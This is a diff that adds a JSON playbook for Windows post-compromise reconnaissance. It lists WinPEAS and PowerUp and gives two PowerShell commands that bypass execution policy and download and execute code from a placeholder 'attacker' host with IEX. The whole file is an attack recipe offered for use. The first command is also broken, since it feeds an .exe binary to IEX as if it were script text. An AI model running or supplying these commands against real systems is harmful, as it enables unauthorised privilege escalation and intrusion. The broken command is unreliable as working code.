@@ -1,0 +1,30 @@
+{
+	"name": "Automated Host Enumeration (Windows)",
+	"description": "Run comprehensive system recon using popular automated tools.",
+	"tools": [
+		{
+			"name": "WinPEAS",
+			"description": "Windows privilege escalation checker",
+			"url": "https://github.com/carlospolop/PEASS-ng/releases/latest"
+		},
+		{
+			"name": "PowerUp",
+			"description": "PowerShell privesc script",
+			"url": "https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1"
+		}
+	],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Execute WinPEAS",
+			"command": "powershell -ep bypass -c \"IEX((New-Object Net.WebClient).DownloadString('http://attacker/winpeas.exe')); winpeas.exe\"",
+			"description": "Download and run full system audit."
+		},
+		{
+			"index": 2,
+			"name": "Run PowerUp",
+			"command": "IEX(New-Object Net.WebClient).DownloadString('http://attacker/PowerUp.ps1'); Invoke-AllChecks",
+			"description": "Check services, DLLs, and misconfigs."
+		}
+	]
+}
